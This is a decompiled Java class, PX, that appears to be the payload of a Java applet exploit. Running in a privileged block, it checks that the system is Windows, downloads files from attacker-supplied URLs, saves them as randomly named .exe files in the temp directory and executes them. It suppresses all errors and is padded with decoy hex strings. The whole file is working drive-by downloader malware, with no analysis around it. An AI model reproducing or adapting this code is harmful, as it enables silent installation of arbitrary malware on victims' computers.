// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   PX.java

package myf.y;

import java.io.*;
import java.net.URL;
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class PX
    implements PrivilegedExceptionAction
{

    public static byte[] StringToBytes(String s)
    {
        byte abyte0[] = new byte[s.length() / 2];
        String s1 = "sdjffjjjjjjjjjjsdfsduuuujf8ds";
        for(int i = 0; i < s.length(); i += 2)
            abyte0[i / 2] = (byte)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));

        return abyte0;
    }

    public Object run()
        throws Exception
    {
        if(data == null)
            return null;
        try
        {
            String s = "os.name";
            String s1 = "00057372001B6A6176612E7574696C2E477265676F7";
            String s2 = "Windows";
            String s3 = System.getProperty(s);
            String s4 = "00057372001B6A6176612E7574696C2E477265676Fasd7";
            if(s3.indexOf(s2) >= 0)
            {
                int i = 1;
                if(cc != null)
                    i = Integer.parseInt(cc);
                for(int j = 0; j < i; j++)
                {
                    URL url = new URL((new StringBuilder()).append(data).append(Integer.toString(j)).toString());
                    url.openConnection();
                    InputStream inputstream = url.openStream();
                    String s5 = "6E69656E744900166D696E696D616C44617973496E46697273745765656B4900096E6578745374616D7049001573657269616C56657273696F6E4F6E53747265616D4A000474696D655B00066669656C64737400025B495B000569735365747400025B5A4C00047A6F6E657400144C6A6176612F7574696C2F54696D655A6";
                    String s6 = (new StringBuilder()).append(System.getProperty("java.io.tmpdir")).append(File.separator).append(Math.random()).append(".exe").toString();
                    FileOutputStream fileoutputstream = new FileOutputStream(s6);
                    int k;
                    int l;
                    for(l = 0; (k = inputstream.read()) != -1; l++)
                        fileoutputstream.write(k);

                    inputstream.close();
                    fileoutputstream.close();
                    String s7 = "6E69656E744900166D696E696D616C44617973496E    46697273745765656B4900096E6578745374616D704   9001573657269616C56657273696F6E4F6E53747265   616D4A000474696D655B00066669656C64737400025B495B000569735365747400025B5A4C00047A6F6E657400144C6A6176612F7574696C2F54696D655A6";
                    if(l >= 1024)
                        Runtime.getRuntime().exec(s6);
                }

            }
        }
        catch(Exception exception) { }
        return null;
    }

    public PX()
    {
        try
        {
            AccessController.doPrivileged(this);
        }
        catch(Exception exception) { }
    }

    public static String data = null;
    public static String cc = null;

}
